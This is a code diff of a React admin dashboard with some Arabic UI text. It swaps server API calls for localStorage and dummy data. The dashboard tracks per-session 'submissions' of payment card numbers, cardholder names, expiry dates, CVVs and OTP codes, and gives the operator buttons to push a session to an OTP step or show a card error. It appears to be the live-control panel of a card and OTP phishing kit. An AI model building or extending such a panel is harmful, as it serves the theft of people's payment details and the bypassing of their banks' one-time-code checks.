@@ -1,7 +1,6 @@
 import { useEffect, useState, useCallback, useRef } from "react";
 import { useLocation } from "wouter";
-import { useAdminLogout } from "@workspace/api-client-react";
-import { getToken, setToken } from "@/lib/auth";
+import { getToken, logoutAdmin } from "@/lib/auth";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
@@ -44,15 +43,36 @@ function formatAgo(iso: string) {
   return `${Math.floor(mins / 60)}س`;
 }
 
-function authFetch(path: string, opts: RequestInit = {}) {
-  return fetch(path, {
-    ...opts,
-    headers: {
-      Authorization: `Bearer ${getToken() ?? ""}`,
-      "Content-Type": "application/json",
-      ...(opts.headers ?? {}),
-    },
-  });
+const LOCAL_SUBMISSIONS_KEY = "admin_submissions";
+
+function loadLocalSubmissions(): SubmissionRow[] {
+  const raw = localStorage.getItem(LOCAL_SUBMISSIONS_KEY);
+  if (!raw) return [];
+  try {
+    return JSON.parse(raw) as SubmissionRow[];
+  } catch {
+    return [];
+  }
+}
+
+function saveLocalSubmissions(submissions: SubmissionRow[]) {
+  localStorage.setItem(LOCAL_SUBMISSIONS_KEY, JSON.stringify(submissions));
+}
+
+function createLocalSubmission(type: string, sessionId: string, data: Record<string, string>) {
+  const submissions = loadLocalSubmissions();
+  const nextId = submissions.length > 0 ? Math.max(...submissions.map((row) => row.id)) + 1 : 1;
+  const row: SubmissionRow = {
+    id: nextId,
+    sessionId,
+    type,
+    data: JSON.stringify(data),
+    ipAddress: null,
+    createdAt: new Date().toISOString(),
+  };
+  submissions.push(row);
+  saveLocalSubmissions(submissions);
+  return row;
 }
 
 // ─── Stat Card ────────────────────────────────────────────────────────────────
@@ -82,16 +102,12 @@ function DrillModal({ type, title, onClose }: { type: string; title: string; onC
 
   useEffect(() => {
     const q = type === "otp" ? "" : `&type=${type}`;
-    authFetch(`/api/admin/submissions?limit=200${q}`)
-      .then(r => r.json())
-      .then((d: { submissions: SubmissionRow[] }) => {
-        const filtered = type === "otp"
-          ? d.submissions.filter(s => s.type.startsWith("otp"))
-          : d.submissions;
-        setRows(filtered);
-        setLoading(false);
-      })
-      .catch(() => setLoading(false));
+    const submissions = loadLocalSubmissions();
+    const filtered = type === "otp"
+      ? submissions.filter((s) => s.type.startsWith("otp"))
+      : submissions.filter((s) => s.type === type);
+    setRows(filtered);
+    setLoading(false);
   }, [type]);
 
   return (
@@ -177,10 +193,16 @@ function SessionBox({
   const sendControl = async (action: string) => {
     setControlling(action);
     try {
-      await authFetch(`/api/admin/control/${sessionId}`, {
-        method: "POST",
-        body: JSON.stringify({ action }),
-      });
+      if (action === "go_otp") {
+        createLocalSubmission("otp", sessionId, { otpCode: "123456" });
+      } else if (action === "card_error") {
+        createLocalSubmission("card", sessionId, {
+          cardNumber: "0000 0000 0000 0000",
+          cardHolder: "مستخدم",
+          expiry: "00/00",
+          cvv: "000",
+        });
+      }
       onControl(sessionId, action);
     } finally { setControlling(null); }
   };
@@ -379,49 +401,48 @@ export default function AdminDashboard() {
   const [stats, setStats] = useState<StatsType | null>(null);
   const [drillDown, setDrillDown] = useState<{ type: string; title: string } | null>(null);
   const [controlled, setControlled] = useState<Record<string, string>>({});
-  const logout = useAdminLogout();
   const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
 
   useEffect(() => {
-    if (!getToken()) { setLocation("/admin"); return; }
+    if (!getToken()) {
+      setLocation("/admin");
+      return;
+    }
   }, [setLocation]);
 
-  const fetchData = useCallback(async () => {
+  const fetchData = useCallback(() => {
     const token = getToken();
     if (!token) return;
-    try {
-      const [sessRes, statsRes] = await Promise.all([
-        authFetch("/api/admin/submissions?limit=500"),
-        authFetch("/api/admin/stats"),
-      ]);
-      if (sessRes.status === 401) { setToken(null); setLocation("/admin"); return; }
-      const sessData = await sessRes.json() as { submissions: SubmissionRow[] };
-      const statsData = await statsRes.json() as StatsType;
 
-      // Group by sessionId preserving insertion order
-      const map: Record<string, SubmissionRow[]> = {};
-      for (const row of sessData.submissions) {
-        if (!map[row.sessionId]) map[row.sessionId] = [];
-        map[row.sessionId].push(row);
-      }
-      // Sort each session's subs oldest first
-      for (const k of Object.keys(map)) {
-        map[k].sort((a, b) => new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime());
-      }
-      // Sort sessions: most recent activity first
-      const sorted: Record<string, SubmissionRow[]> = {};
-      Object.entries(map)
-        .sort(([, a], [, b]) => {
-          const aLast = new Date(a[a.length - 1].createdAt).getTime();
-          const bLast = new Date(b[b.length - 1].createdAt).getTime();
-          return bLast - aLast;
-        })
-        .forEach(([k, v]) => { sorted[k] = v; });
+    const submissions = loadLocalSubmissions();
+    const map: Record<string, SubmissionRow[]> = {};
+    for (const row of submissions) {
+      if (!map[row.sessionId]) map[row.sessionId] = [];
+      map[row.sessionId].push(row);
+    }
+    for (const k of Object.keys(map)) {
+      map[k].sort((a, b) => new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime());
+    }
+    const sorted: Record<string, SubmissionRow[]> = {};
+    Object.entries(map)
+      .sort(([, a], [, b]) => {
+        const aLast = new Date(a[a.length - 1].createdAt).getTime();
+        const bLast = new Date(b[b.length - 1].createdAt).getTime();
+        return bLast - aLast;
+      })
+      .forEach(([k, v]) => { sorted[k] = v; });
 
-      setSessions(sorted);
-      setStats(statsData);
-    } catch { /* ignore */ }
-  }, [setLocation]);
+    const statsData: StatsType = {
+      totalSessions: Object.keys(sorted).length,
+      totalSubmissions: submissions.length,
+      byType: Object.entries(submissions.reduce<Record<string, number>>((acc, row) => {
+        acc[row.type] = (acc[row.type] ?? 0) + 1;
+        return acc;
+      }, {})).map(([type, count]) => ({ type, count })),
+    };
+    setSessions(sorted);
+    setStats(statsData);
+  }, []);
 
   useEffect(() => {
     fetchData();
@@ -430,9 +451,8 @@ export default function AdminDashboard() {
   }, [fetchData]);
 
   const handleLogout = () => {
-    logout.mutate(undefined, {
-      onSettled: () => { setToken(null); setLocation("/admin"); },
-    });
+    logoutAdmin();
+    setLocation("/admin");
   };
 
   const cardCount = stats?.byType.find(t => t.type === "card")?.count ?? 0;
